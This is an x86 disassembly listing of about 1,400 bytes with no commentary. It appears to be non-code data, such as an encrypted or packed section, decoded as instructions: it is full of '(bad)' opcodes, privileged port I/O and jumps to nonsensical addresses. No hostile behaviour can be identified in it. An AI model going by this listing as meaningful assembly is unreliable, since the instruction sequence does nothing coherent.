  407a89:	add    eax,0xc4a5a0b8
  407a8e:	shr    bh,cl
  407a90:	cld    
  407a91:	add    ebx,DWORD PTR [ecx+0x2b]
  407a94:	es push esi
  407a96:	add    al,0x83
  407a98:	jmp    0xbd28af6d
  407a9d:	push   edx
  407a9e:	mov    edi,0xf04f8de8
  407aa3:	inc    esi
  407aa4:	inc    edi
  407aa5:	pop    ecx
  407aa6:	jecxz  0x407a94
  407aa8:	lea    eax,[ebp-0x20a331b7]
  407aae:	jg     0x407a69
  407ab0:	sub    bl,BYTE PTR [ebp+0x2b]
  407ab3:	pop    eax
  407ab4:	adc    al,0x3
  407ab6:	inc    eax
  407ab7:	scas   al,BYTE PTR es:[edi]
  407ab8:	dec    eax
  407ab9:	jns    0x407aa8
  407abb:	sub    BYTE PTR [eax+0x24],cl
  407abe:	dec    ebp
  407abf:	sti    
  407ac0:	in     al,dx
  407ac1:	lods   al,BYTE PTR ds:[esi]
  407ac2:	adc    ecx,ecx
  407ac4:	sub    ah,BYTE PTR [esi-0x48]
  407ac7:	mov    bh,0xf9
  407ac9:	sub    ch,BYTE PTR [ecx]
  407acb:	in     eax,0xde
  407acd:	mov    ds,WORD PTR [ecx]
  407acf:	xchg   ebp,eax
  407ad0:	std    
  407ad1:	in     eax,dx
  407ad2:	cli    
  407ad3:	sar    DWORD PTR [ecx+edx*4+0x5c],cl
  407ad7:	mov    al,ds:0xf2d2c267
  407adc:	cs jnp 0x407a9d
  407adf:	jg     0x407af9
  407ae1:	cdq    
  407ae2:	mov    esp,0x5e1dccb0
  407ae7:	jg     0x407aae
  407ae9:	and    BYTE PTR [edi+0x721ef505],ah
  407aef:	inc    ebp
  407af0:	sbb    al,0xf0
  407af2:	fistp  WORD PTR [ebx]
  407af4:	cmp    BYTE PTR [ecx+0x7b],bh
  407af7:	cmp    al,0xa7
  407af9:	sbb    dl,BYTE PTR [edx+0x5b]
  407afc:	or     edx,ebp
  407afe:	adc    al,0xc6
  407b00:	xor    al,bh
  407b02:	popa   
  407b03:	les    esp,FWORD PTR [edx+0x46]
  407b06:	and    ch,BYTE PTR [eax+0x27]
  407b09:	popf   
  407b0a:	mov    edi,DWORD PTR [ecx-0x3f]
  407b0d:	xchg   ecx,eax
  407b0e:	add    eax,0x7fc42eac
  407b13:	das    
  407b14:	xchg   edx,eax
  407b15:	shr    bh,0x77
  407b18:	js     0x407ab3
  407b1a:	mov    ebp,0x46678721
  407b1f:	dec    ecx
  407b20:	hlt    
  407b21:	outs   dx,BYTE PTR ds:[esi]
  407b22:	js     0x407ae3
  407b24:	inc    esi
  407b25:	call   0x7485f6ef
  407b2a:	jg     0x407b58
  407b2c:	add    cl,0xba
  407b2f:	mov    ds:0x9e728575,al
  407b34:	pop    edi
  407b35:	shl    BYTE PTR [edi-0x410719e],0xea
  407b3c:	jmp    0x407afc
  407b3e:	cmp    al,0xe4
  407b40:	mov    ch,0x9
  407b42:	es pop edx
  407b44:	inc    esi
  407b45:	pop    ebx
  407b46:	push   cs
  407b47:	sbb    al,al
  407b49:	cs jle 0x407b71
  407b4c:	pop    es
  407b4d:	mov    bl,0x5b
  407b4f:	push   esp
  407b50:	jl     0x407ae3
  407b52:	loope  0x407bd2
  407b54:	addr16 or al,0x8f
  407b57:	sbb    eax,0x3e23bd75
  407b5c:	clc    
  407b5d:	mov    ah,0xf6
  407b5f:	std    
  407b60:	lods   eax,DWORD PTR ds:[esi]
  407b61:	inc    esp
  407b62:	cmp    eax,0xf31b6d93
  407b67:	pop    eax
  407b68:	mov    bh,0xc5
  407b6a:	xor    ch,BYTE PTR [edi-0x6c0a1df1]
  407b70:	data16 into 
  407b72:	addr16 (bad) 
  407b74:	sub    BYTE PTR [eax+0x3],bl
  407b77:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407b78:	xor    ch,cl
  407b7a:	and    BYTE PTR [ebx],bh
  407b7c:	mov    ah,0xef
  407b7e:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  407b80:	(bad)  
  407b81:	jae    0x407bc1
  407b83:	mov    cl,0xab
  407b85:	pop    ds
  407b86:	or     DWORD PTR [esi-0x329daf2b],esp
  407b8c:	sbb    eax,DWORD PTR [ecx+0x62]
  407b8f:	leave  
  407b90:	xor    ecx,esp
  407b92:	retf   0x51c3
  407b95:	fstp   TBYTE PTR [ebx]
  407b97:	aad    0xd9
  407b99:	push   cs
  407b9a:	xor    DWORD PTR [ecx+0x20],esi
  407b9d:	jnp    0x407b89
  407b9f:	jne    0x407c09
  407ba1:	rol    BYTE PTR [esp+esi*8],1
  407ba4:	mov    al,0x7d
  407ba6:	scas   eax,DWORD PTR es:[edi]
  407ba7:	outs   dx,DWORD PTR ds:[si]
  407ba9:	mov    edx,0x1802f100
  407bae:	push   cs
  407baf:	ret    
  407bb0:	pop    ss
  407bb1:	sub    dl,ch
  407bb3:	sub    eax,0x18624990
  407bb8:	dec    ebp
  407bb9:	push   es
  407bba:	cmc    
  407bbb:	cld    
  407bbc:	add    DWORD PTR [eax+ebx*4],esp
  407bbf:	call   0x967aa24c
  407bc4:	int    0xbf
  407bc6:	daa    
  407bc7:	mov    DWORD PTR [ebp+0x2e],esi
  407bca:	cwde   
  407bcb:	scas   al,BYTE PTR es:[edi]
  407bcc:	push   ds
  407bcd:	xchg   edi,eax
  407bce:	mov    ds:0xd860f0b0,eax
  407bd3:	mov    bh,0x41
  407bd5:	xor    dh,BYTE PTR [esi+0x3932c6cb]
  407bdb:	clc    
  407bdc:	fs xor esi,DWORD PTR gs:[esi]
  407be0:	and    ecx,DWORD PTR [ecx+0x705fe9a5]
  407be6:	sbb    esi,DWORD PTR [ebp+0x619ad3f2]
  407bec:	pop    edi
  407bed:	xchg   esi,eax
  407bee:	xchg   ecx,eax
  407bef:	mov    ds:0x3d777ff,al
  407bf4:	jne    0x407b95
  407bf6:	shr    esp,cl
  407bf8:	push   ds
  407bf9:	in     eax,0x8c
  407bfb:	sbb    DWORD PTR [ebp+0x1190998f],esi
  407c01:	or     eax,0xe66e0225
  407c06:	push   ebx
  407c07:	inc    eax
  407c08:	(bad)  
  407c09:	mov    ecx,0x1c87ed97
  407c0e:	jecxz  0x407bd4
  407c10:	stos   BYTE PTR es:[edi],al
  407c11:	push   ebx
  407c12:	jp     0x407c7f
  407c14:	inc    ecx
  407c15:	les    edi,FWORD PTR ds:0x7830c8bc
  407c1b:	mov    eax,ds:0x7c815cf0
  407c20:	ins    BYTE PTR es:[edi],dx
  407c21:	sub    dh,BYTE PTR [edx+0x0]
  407c24:	add    al,0x3c
  407c26:	dec    edi
  407c27:	mov    ch,0x75
  407c29:	dec    eax
  407c2a:	jmp    FWORD PTR [eax-0x5f]
  407c2d:	mov    bh,0xe2
  407c2f:	inc    edx
  407c30:	add    BYTE PTR [edx-0x17],cl
  407c33:	dec    edx
  407c34:	and    eax,DWORD PTR [eax]
  407c36:	add    BYTE PTR [eax-0x5d10c7b2],dh
  407c3c:	mov    esi,DWORD PTR [ebx+0x33]
  407c3f:	(bad)  
  407c40:	sbb    BYTE PTR ds:0x59bb05e6,cl
  407c46:	pop    ds
  407c47:	push   es
  407c48:	cmp    bh,BYTE PTR [esp+edi*2+0x4e]
  407c4c:	pop    edi
  407c4d:	jl     0x407ccb
  407c4f:	loope  0x407c80
  407c51:	cdq    
  407c52:	fsubrp st(7),st
  407c54:	mov    ebp,0xf56c3318
  407c59:	push   esp
  407c5a:	in     al,dx
  407c5b:	clc    
  407c5c:	xchg   esp,eax
  407c5d:	enter  0xa5b1,0xa0
  407c61:	push   es
  407c62:	jp     0x407cbf
  407c64:	cmp    ecx,DWORD PTR [esi+esi*4+0x4f81c92d]
  407c6b:	inc    edi
  407c6c:	mov    BYTE PTR [esp+ebx*4-0x5a1f2258],bh
  407c73:	int3   
  407c74:	retf   
  407c75:	jmp    0xfe43c6b9
  407c7a:	out    0xe5,eax
  407c7c:	comiss xmm7,DWORD PTR [esi]
  407c7f:	pop    esp
  407c80:	or     DWORD PTR [edi+0x716d564f],0x35
  407c87:	inc    ebp
  407c88:	stos   BYTE PTR es:[edi],al
  407c89:	das    
  407c8a:	cmp    al,BYTE PTR [eax]
  407c8c:	jmp    0x4b0e:0xc96551df
  407c93:	data16 mov ch,0xdf
  407c96:	mov    bh,0xf5
  407c98:	mov    ecx,0x40a75295
  407c9d:	xor    eax,0x60e74c2b
  407ca2:	xchg   ebp,eax
  407ca3:	pop    ecx
  407ca4:	xchg   ebp,eax
  407ca5:	xchg   BYTE PTR [eax-0x32c1b366],dh
  407cab:	inc    ecx
  407cac:	xchg   DWORD PTR [esi+0x37],esi
  407caf:	test   esi,ebx
  407cb1:	inc    ebp
  407cb2:	ficomp DWORD PTR [eax+eiz*8]
  407cb5:	inc    edi
  407cb6:	bound  edi,QWORD PTR [eax-0x52]
  407cb9:	sti    
  407cba:	test   BYTE PTR [ecx-0x74],ch
  407cbd:	sbb    BYTE PTR [ecx],ah
  407cbf:	in     al,0x72
  407cc1:	and    ebp,DWORD PTR [ebp-0x7b0ba9c5]
  407cc7:	mov    cl,0x81
  407cc9:	pop    ss
  407cca:	sub    BYTE PTR [ebp+ebx*4+0x3],ch
  407cce:	ret    
  407ccf:	and    al,0x1e
  407cd1:	push   esp
  407cd2:	adc    dl,BYTE PTR [edi+eiz*4]
  407cd5:	cwde   
  407cd6:	adc    ah,BYTE PTR [esi-0x4411b3ef]
  407cdc:	ins    BYTE PTR es:[edi],dx
  407cdd:	icebp  
  407cde:	in     al,dx
  407cdf:	push   ds
  407ce0:	and    eax,0x37f6acad
  407ce5:	out    0x8d,eax
  407ce7:	jne    0x407cc6
  407ce9:	jle    0x407c85
  407ceb:	mov    BYTE PTR [ebx+ebp*8+0x6d],dl
  407cef:	std    
  407cf0:	pop    edi
  407cf1:	stc    
  407cf2:	and    DWORD PTR [edx-0x2d682634],0x7b3958a3
  407cfc:	xor    dl,BYTE PTR [ecx+0x7e]
  407cff:	lea    edx,[esi+0x1e]
  407d02:	cmp    edx,DWORD PTR [ecx-0x1c]
  407d05:	retf   
  407d06:	adc    al,0x66
  407d08:	mov    ?,WORD PTR [ebx]
  407d0a:	cmp    eax,0xe68920f9
  407d0f:	adc    cl,BYTE PTR [ecx-0xd]
  407d12:	jbe    0x407d8b
  407d14:	pop    ebx
  407d15:	inc    esp
  407d16:	pop    ecx
  407d17:	cli    
  407d18:	outs   dx,BYTE PTR ds:[esi]
  407d19:	xchg   ebx,eax
  407d1a:	arpl   WORD PTR [ebp+0x7c2367a2],cx
  407d20:	mov    ecx,0xcf28aea8
  407d25:	stos   BYTE PTR es:[edi],al
  407d26:	mov    ds:0xcfbc5038,eax
  407d2b:	stos   BYTE PTR es:[edi],al
  407d2c:	outs   dx,DWORD PTR ds:[esi]
  407d2d:	push   ebx
  407d2e:	dec    ebx
  407d2f:	(bad)  [ecx+0x5a7663c2]
  407d35:	out    0xa7,al
  407d37:	push   ebp
  407d38:	push   ebp
  407d39:	popf   
  407d3a:	repz bound edx,QWORD PTR [eax-0x67]
  407d3e:	repnz pop esp
  407d40:	and    ecx,esp
  407d42:	pop    edx
  407d43:	in     al,dx
  407d44:	mov    al,0x13
  407d46:	mov    ds:0x13514f5e,eax
  407d4b:	mov    ah,0x6e
  407d4d:	inc    ebp
  407d4e:	aas    
  407d4f:	mov    bl,0xc9
  407d51:	fdiv   QWORD PTR [esi-0x20207045]
  407d57:	loope  0x407d13
  407d59:	jno    0x407db3
  407d5b:	push   edi
  407d5c:	sbb    bl,BYTE PTR [esp+edx*8]
  407d5f:	mov    ds:0x641fdbea,eax
  407d64:	les    edx,FWORD PTR [edx]
  407d66:	and    cl,dl
  407d68:	gs cmc 
  407d6a:	push   edx
  407d6b:	push   cs
  407d6c:	sbb    al,0xc0
  407d6e:	lock mov al,bl
  407d71:	aaa    
  407d72:	in     eax,dx
  407d73:	stc    
  407d74:	popa   
  407d75:	mov    bl,0x50
  407d77:	or     BYTE PTR [eax],ah
  407d79:	(bad)  
  407d7a:	fisttp WORD PTR [edi+ecx*8+0x72a62968]
  407d81:	and    BYTE PTR [ebx],dh
  407d83:	pop    esi
  407d84:	test   BYTE PTR gs:[ecx+ebx*8+0x5b],ah
  407d89:	push   ds
  407d8a:	retf   
  407d8b:	rcl    BYTE PTR [edx-0x22],cl
  407d8e:	cdq    
  407d8f:	add    cl,cl
  407d91:	dec    eax
  407d92:	out    dx,al
  407d93:	mov    eax,ds:0x11e80ea9
  407d98:	jne    0x407d21
  407d9a:	aaa    
  407d9b:	rcl    DWORD PTR ds:[ecx+0x3f],1
  407d9f:	push   ecx
  407da0:	sbb    BYTE PTR [edi],cl
  407da2:	sub    al,0x31
  407da4:	es and al,bh
  407da7:	mov    dh,0xb8
  407da9:	mov    al,0x1d
  407dab:	mov    WORD PTR [ebx+eax*8],cs
  407dae:	test   al,0x9c
  407db0:	sub    BYTE PTR [edx+0x7f7cc933],al
  407db6:	mov    ds:0x4249b87f,al
  407dbb:	xor    esp,edx
  407dbd:	pop    esp
  407dbe:	(bad)
  407dc2:	mov    cl,0xe5
  407dc4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407dc5:	xchg   ecx,eax
  407dc6:	rcl    BYTE PTR [ecx+0x32fb5eb],1
  407dcc:	sbb    edx,DWORD PTR [ebx+0x79]
  407dcf:	inc    ebx
  407dd0:	out    dx,eax
  407dd1:	pusha  
  407dd2:	sub    al,0x4e
  407dd4:	cmp    al,cl
  407dd6:	sbb    BYTE PTR [esi-0x70],0xd0
  407dda:	inc    ecx
  407ddb:	adc    ecx,DWORD PTR [ecx+ebx*1+0x56c8bf6a]
  407de2:	push   eax
  407de3:	out    0x58,eax
  407de5:	or     cl,BYTE PTR [eax-0x1eb6e8f9]
  407deb:	xor    BYTE PTR [edi+0x54],dl
  407dee:	xchg   esi,eax
  407def:	ins    DWORD PTR es:[edi],dx
  407df0:	(bad)  
  407df1:	(bad)  
  407df2:	mov    eax,ds:0xb5c8eb88
  407df7:	jne    0x407ddc
  407df9:	xor    edi,0x3a63480f
  407dff:	cli    
  407e00:	in     al,0x4a
  407e02:	ret    
  407e03:	je     0x407e4c
  407e05:	jmp    edx
  407e07:	jo     0x407e1a
  407e09:	in     eax,0xdc
  407e0b:	pop    ss
  407e0c:	out    0x3b,al
  407e0e:	or     dh,BYTE PTR [eax]
  407e10:	mov    al,0x9e
  407e12:	xor    eax,0x9c6c79b
  407e17:	or     dl,BYTE PTR [ebp+0x9]
  407e1a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407e1b:	test   eax,0xf1a6d61a
  407e20:	fdivr  QWORD PTR [ecx+0x39]
  407e23:	rcr    DWORD PTR [esi],1
  407e25:	gs ret 
  407e27:	hlt    
  407e28:	push   0x79507beb
  407e2d:	enter  0xa602,0x1c
  407e31:	hlt    
  407e32:	mov    dl,0x36
  407e34:	mov    esp,0x648b355f
  407e39:	jbe    0x407e6d
  407e3b:	icebp  
  407e3c:	xchg   edx,eax
  407e3d:	jo     0x407dc1
  407e3f:	pop    eax
  407e40:	jno    0x407e08
  407e42:	dec    ecx
  407e43:	inc    edx
  407e44:	int3   
  407e45:	loopne 0x407e74
  407e47:	test   ah,al
  407e49:	les    edx,FWORD PTR [esi+0x2c]
  407e4c:	or     al,0x81
  407e4e:	mov    ds:0x318f4829,al
  407e53:	or     eax,0x73ae2309
  407e58:	push   edx
  407e59:	jns    0x407e58
  407e5b:	pmaxub mm0,QWORD PTR [edi-0x5e302a31]
  407e62:	mov    ch,0x8f
  407e64:	sti    
  407e65:	lods   eax,DWORD PTR ds:[esi]
  407e66:	(bad)  
  407e67:	pushf  
  407e68:	dec    eax
  407e69:	ror    DWORD PTR [edx+0xe],1
  407e6c:	dec    esp
  407e6d:	inc    esp
  407e6e:	test   eax,0x52cfddaa
  407e73:	add    DWORD PTR [ecx],edi
  407e75:	clc    
  407e76:	jl     0x407e60
  407e78:	popa   
  407e79:	ins    DWORD PTR es:[edi],dx
  407e7a:	sbb    ecx,ecx
  407e7c:	sbb    ecx,ecx
  407e7e:	pop    ds
  407e7f:	push   esp
  407e80:	pop    es
  407e81:	inc    ebx
  407e82:	shl    DWORD PTR ss:[ebp+0x18590753],1
  407e89:	loope  0x407e6d
  407e8b:	into   
  407e8c:	inc    edi
  407e8d:	inc    ebp
  407e8e:	xchg   ebp,eax
  407e8f:	mov    eax,ds:0x96433733
  407e94:	push   ss
  407e95:	imul   ebp,DWORD PTR [edi],0x9
  407e98:	cmp    eax,0xa7e1687
  407e9d:	dec    esi
  407e9e:	aaa    
  407e9f:	lock repnz push 0xd62e5fd8
  407ea6:	dec    esp
  407ea7:	aaa    
  407ea8:	cmp    DWORD PTR ds:0x61386306,0x3df4ff20
  407eb2:	nop
  407eb3:	inc    edx
  407eb4:	or     al,0x50
  407eb6:	cdq    
  407eb7:	or     bl,BYTE PTR [esi+0x659b4af2]
  407ebd:	(bad)  
  407ebe:	(bad)  
  407ebf:	mov    ebx,0x7bb9b800
  407ec4:	xor    al,0x26
  407ec6:	adc    eax,0x84fd7a87
  407ecb:	jb     0x407ef5
  407ecd:	repnz stos BYTE PTR es:[edi],al
  407ecf:	sahf   
  407ed0:	and    al,0x83
  407ed2:	loopne 0x407e5c
  407ed4:	stos   BYTE PTR es:[edi],al
  407ed5:	mov    ah,0xf7
  407ed7:	mov    BYTE PTR [edx-0x76645844],ah
  407edd:	xchg   DWORD PTR [esi],ebx
  407edf:	xchg   ecx,eax
  407ee0:	inc    ebx
  407ee1:	enter  0x65cf,0xb6
  407ee5:	(bad)  
  407ee7:	mov    ecx,esp
  407ee9:	jo     0x407f5a
  407eeb:	jne    0x407e8d
  407eed:	fdivr  st,st(6)
  407eef:	mov    ah,BYTE PTR [ebx-0x13]
  407ef2:	mov    ss,WORD PTR [ecx+esi*4+0x7a]
  407ef6:	xchg   edi,eax
  407ef7:	dec    ebx
  407ef8:	add    ch,BYTE PTR [edx]
  407efa:	dec    edx
  407efb:	fsubrp st(7),st
  407efd:	aas    
  407efe:	inc    ebp
  407eff:	jne    0x407f18
  407f01:	imul   ebx,DWORD PTR [esi+0x67670927],0x2c6eb730
  407f0b:	cld    
  407f0c:	jecxz  0x407f19
  407f0e:	push   cs
  407f0f:	adc    eax,DWORD PTR [edi-0x2e]
  407f12:	lock loopne 0x407f15
  407f15:	clc    
  407f16:	mov    al,ds:0xb72fb1c6
  407f1b:	das    
  407f1c:	call   0x7178:0x8924a68f
  407f23:	push   0x2e
  407f25:	(bad)  
  407f26:	xor    DWORD PTR [edi-0x14adee89],esi
  407f2c:	lahf   
  407f2d:	scas   al,BYTE PTR es:[edi]
  407f2e:	sti    
  407f2f:	jmp    0x407ec8
  407f31:	jo     0x407f05
  407f33:	mov    ds:0xd13b77a3,eax
  407f38:	xor    dl,ah
  407f3a:	dec    esi
  407f3b:	mov    edx,DWORD PTR ds:0xd806af20
  407f41:	push   cs
  407f42:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407f43:	in     al,dx
  407f44:	adc    DWORD PTR [ebp+0x19],edx
  407f47:	fmul   QWORD PTR [edi]
  407f49:	add    ebp,DWORD PTR [ebp-0x46]
  407f4c:	lahf   
  407f4d:	int    0x80
  407f4f:	push   0x34fc98fe
  407f54:	xchg   esp,eax
  407f55:	or     dl,bh
  407f57:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407f58:	cdq    
  407f59:	or     bl,BYTE PTR [esi-0x8daf18d]
  407f5f:	mov    dl,0xa9
  407f61:	cld    
  407f62:	pop    edx
  407f63:	pop    ecx
  407f64:	mov    al,ds:0x54e42ec5
  407f69:	jp     0x407f49
  407f6b:	dec    esp
  407f6c:	out    dx,eax
  407f6d:	out    dx,eax
  407f6e:	sbb    BYTE PTR [eax],bh
  407f70:	lahf   
  407f71:	int3   
  407f72:	xchg   ebp,eax
  407f73:	in     eax,dx
  407f74:	dec    edx
  407f75:	jmp    DWORD PTR [eax-0x5a]
  407f78:	call   0xc5eb:0x1c1836bb
  407f7f:	jg     0x407fa8
  407f81:	sbb    BYTE PTR ds:0xd1d08b24,cl
  407f87:	xchg   esp,eax
  407f88:	xor    DWORD PTR [ecx-0x22],esp
  407f8b:	rol    esp,0x7e
  407f8e:	or     eax,0x23c4cd6a
  407f93:	push   esp
  407f94:	jge    0x407f59
  407f96:	out    0xd2,eax
  407f98:	popa   
  407f99:	int3   
  407f9a:	jo     0x407fae
  407f9c:	xchg   BYTE PTR [eax-0x71c13436],cl
  407fa2:	jns    0x407fa6
  407fa4:	mov    BYTE PTR [edx-0x69],dh
  407fa7:	fwait
  407fa8:	inc    edi
  407fa9:	jns    0x40800b
  407fab:	pop    edx
  407fac:	ds push ecx
  407fae:	movhps QWORD PTR [ecx+0x29],xmm4
  407fb2:	dec    ebx
  407fb3:	jmp    0x82c8:0x8013b618
  407fba:	push   ecx
  407fbb:	iret   
  407fbc:	add    cl,dh
  407fbe:	out    dx,al
  407fbf:	cs push ss
  407fc1:	inc    ebx
  407fc2:	mov    ah,0x52
  407fc4:	add    al,0x81
  407fc6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407fc7:	add    bh,BYTE PTR [edx-0x7565ce31]
  407fcd:	mov    al,BYTE PTR [ebx+0x5bc3ef6e]
  407fd3:	lods   eax,DWORD PTR ds:[esi]
  407fd4:	sbb    DWORD PTR [ebp+0x209e8c40],eax
  407fda:	je     0x407f94
  407fdc:	cmc    
  407fdd:	mov    cl,0x3e
  407fdf:	les    ebp,FWORD PTR [ecx+0x53245234]
  407fe5:	imul   eax,DWORD PTR [edi+0x1c67fa0e],0xfffffff9
  407fec:	jecxz  0x408000
  407fee:	xchg   bl,ch
  407ff0:	(bad)  
  407ff2:	dec    ebx
  407ff3:	clc    
  407ff4:	push   ecx
  407ff5:	fsubr  DWORD PTR [ecx-0x11]
  407ff8:	int    0x5f
  407ffa:	mov    es,edx
  407ffc:	sub    eax,0x1e8e76ee
  408001:	adc    cl,BYTE PTR [esi+0x1f4c1731]
  408007:	ficomp WORD PTR [edi-0xa7ceab9]
  40800d:	(bad)  
  40800e:	mov    ds:0xc16855d7,al
  408013:	(bad)  
  408014:	bnd jmp 0x7f290795
  40801a:	adc    ch,BYTE PTR [ecx-0x5c]
  40801d:	ins    BYTE PTR es:[edi],dx
  40801e:	or     al,0x80
  408020:	add    eax,DWORD PTR [ebp-0x1be86706]
  408026:	cld    
  408027:	cmp    al,0xff
  408029:	mov    ah,0xc1
  40802b:	adc    eax,0x249079a6
  408030:	cmp    esi,DWORD PTR [edi+0x23]
  408033:	sar    BYTE PTR [edi],0x45
  408036:	call   0x8afa:0x45b8d7dc
  40803d:	pop    ebp
  40803e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40803f:	inc    esp
  408040:	jno    0x407fdd
  408042:	push   esi
  408043:	xchg   edi,eax
  408044:	mov    al,ds:0xbebf0675
  408049:	add    BYTE PTR [esi+edi*4],dl
  40804c:	inc    ebp
  40804d:	mov    ebp,0xf3319590
  408052:	imul   eax,DWORD PTR [ecx],0x1b937096
  408058:	dec    esp
  408059:	shl    DWORD PTR [eax-0x1b],0x77
  40805d:	adc    al,0x56
  40805f:	inc    esi
  408060:	popf   
  408061:	stos   DWORD PTR es:[edi],eax
  408062:	ss jo  0x408088
  408065:	mov    bl,0xb8
  408067:	lds    edi,FWORD PTR [edi]
  408069:	or     al,0x45
  40806b:	cld    
  40806c:	bound  ebx,QWORD PTR ds:0x9d33fba7
  408072:	in     eax,dx
  408073:	push   ds
  408074:	cmp    BYTE PTR [esp+ebp*2],al
  408077:	punpckldq mm2,DWORD PTR ds:0xb2fa33c
  40807e:	jae    0x408057
  408080:	iret   
  408081:	dec    edx
  408082:	mov    bh,0x77
  408084:	mov    edi,0x62018b0a
  408089:	xor    BYTE PTR [edi-0x35741697],0xd6
  408090:	idiv   DWORD PTR [ebx+0x71]
  408093:	push   cs
  408094:	ficomp WORD PTR [edx]
  408096:	pop    ds
  408097:	cmp    dl,BYTE PTR [ebx-0x58]
  40809a:	add    ecx,DWORD PTR [eax+eax*4]
  40809d:	jnp    0x408089
  40809f:	js     0x408103
  4080a1:	addr16 and edx,edx
  4080a4:	mov    ebp,0xba4fcb8e
  4080a9:	ins    DWORD PTR es:[edi],dx
  4080aa:	push   es
  4080ab:	mov    edi,0xea8044a6
  4080b0:	jge    0x4080ef
  4080b2:	rcl    BYTE PTR [ebp+0x13],cl
  4080b5:	lds    ebp,FWORD PTR [ebx-0x2f7cf57b]
  4080bb:	mov    esp,0x788d359b
  4080c0:	adc    BYTE PTR [eax+0x1d0f5b87],ch
  4080c6:	or     esi,DWORD PTR [edi+0x3532a23b]
  4080cc:	out    0x27,eax
  4080ce:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  4080d0:	dec    ebp
  4080d1:	add    eax,0x1eee7f7a
  4080d6:	test   BYTE PTR [ecx],dh
  4080d8:	iret   
  4080d9:	in     eax,dx
  4080da:	mov    ecx,0x6b3416a1
  4080df:	pop    edi
  4080e0:	scas   al,BYTE PTR es:[edi]
  4080e1:	cmp    edi,eax
  4080e3:	jns    0x4080e2
  4080e5:	sbb    ebp,DWORD PTR [edx-0xf8763a3]
  4080eb:	fiadd  WORD PTR [edi]
  4080ed:	arpl   WORD PTR [ecx+0x402812c0],si
  4080f3:	sub    edx,edx
  4080f5:	ss cwde 
  4080f7:	jmp    0x40807c
  4080f9:	popf   
  4080fa:	es in  al,0xfd
  4080fd:	inc    edx
  4080fe:	(bad)  
  4080ff:	int    0xd
  408101:	out    dx,eax
  408102:	das    
  408103:	add    DWORD PTR [edi+0x53],eax
  408106:	mov    di,0x92fd
  40810a:	test   al,0x5a
  40810c:	pop    esi
  40810d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40810e:	jp     0x4080b5
  408110:	daa    
  408111:	imul   esi,DWORD PTR [ecx+esi*8-0x48],0x258a8c8b
  408119:	in     al,0xfe
  40811b:	shl    edi,1
  40811d:	shl    BYTE PTR [ebp-0x14],cl
  408120:	cmp    BYTE PTR [esi+ebp*8],dl
  408123:	fwait
  408124:	lea    edi,[ecx+0x5533281e]
  40812a:	stc    
  40812b:	shl    DWORD PTR [eax-0x69306924],cl
  408131:	shl    BYTE PTR [edi+0x68],cl
  408134:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408135:	mov    WORD PTR [ecx+0x25e25318],?
  40813b:	leave  
  40813c:	pop    ebx
  40813d:	push   edx
  40813e:	inc    edx
  40813f:	push   ebp
  408140:	xor    esi,DWORD PTR [esi]
  408142:	(bad)
  408147:	mov    DWORD PTR [edi-0x20],ebp
  40814a:	jmp    0xe7b61170
  40814f:	fbstp  TBYTE PTR [esp+ebx*8]
  408152:	or     al,0xfb
  408154:	adc    DWORD PTR [edi],ecx
  408156:	xor    BYTE PTR [ebx+ebp*2],dh
  408159:	(bad)  
  40815a:	repnz push 0x21
  40815d:	daa    
  40815e:	jmp    0xa43646d
  408163:	sbb    al,0x3b
  408165:	rcl    DWORD PTR [edx-0x5d2130a6],1
  40816b:	int3   
  40816c:	leave  
  40816d:	scas   eax,DWORD PTR es:[edi]
  40816e:	iret   
  40816f:	or     edx,esp
  408171:	stos   BYTE PTR es:[edi],al
  408172:	aad    0x61
  408174:	xchg   DWORD PTR [eax-0x65],ebp
  408177:	cmp    bh,0xea
  40817a:	cs and esp,edi
  40817d:	std    
  40817e:	jmp    0x6087f7a7
  408183:	pop    ebp
  408184:	mov    bl,0x64
  408186:	mov    dl,0x15
  408188:	dec    edx
  408189:	mov    eax,ds:0xcc196798
  40818e:	popa   
  40818f:	ins    DWORD PTR es:[edi],dx
  408190:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408191:	ins    BYTE PTR es:[edi],dx
  408192:	xor    eax,eax
  408194:	out    dx,al
  408195:	ret    0x71db
  408198:	cmp    DWORD PTR [ebp*1+0x7b9dc414],0xffffff89
  4081a0:	popa   
  4081a1:	fbstp  TBYTE PTR [esi]
  4081a3:	pop    ecx
  4081a4:	cmp    al,0x20
  4081a6:	xor    al,0x87
  4081a8:	lods   eax,DWORD PTR ds:[esi]
  4081a9:	mov    eax,ds:0x38a6eef8
  4081ae:	sbb    cl,ch
  4081b0:	inc    edi
  4081b1:	xor    BYTE PTR [ebp-0x1],dh
  4081b4:	or     esp,DWORD PTR [ecx+0x78523eaf]
  4081ba:	jecxz  0x408223
  4081bc:	dec    eax
  4081bd:	xlat   BYTE PTR ds:[ebx]
  4081be:	ror    cl,0xf7
  4081c1:	jle    0x408224
  4081c3:	push   ecx
  4081c4:	aas    
  4081c5:	dec    edx
  4081c6:	dec    ebx
  4081c7:	mov    ebp,eax
  4081c9:	fisub  WORD PTR [eax-0x39]
  4081cc:	(bad)  
  4081cd:	pop    esp
  4081ce:	jne    0x408158
  4081d0:	add    esp,DWORD PTR [ebx]
  4081d2:	and    DWORD PTR [ebp+0x2ae01265],esi
  4081d8:	inc    ebx
  4081d9:	inc    edx
  4081da:	out    dx,eax
  4081db:	cmp    al,0xac
  4081dd:	jmp    0xba0ae3fd
  4081e2:	cmp    cl,BYTE PTR [edi-0x1a]
  4081e5:	sub    DWORD PTR [eax],edx
  4081e7:	inc    ebx
  4081e8:	leave  
  4081e9:	jge    0x408218
  4081eb:	or     BYTE PTR [edx-0x6d9dace],dl
  4081f1:	fwait
  4081f2:	or     esi,DWORD PTR [esi-0x6250b8e7]
  4081f8:	xor    eax,0xf4b928ca
  4081fd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4081fe:	inc    edi
  4081ff:	(bad)  
  408200:	out    0x42,eax
  408202:	cld    
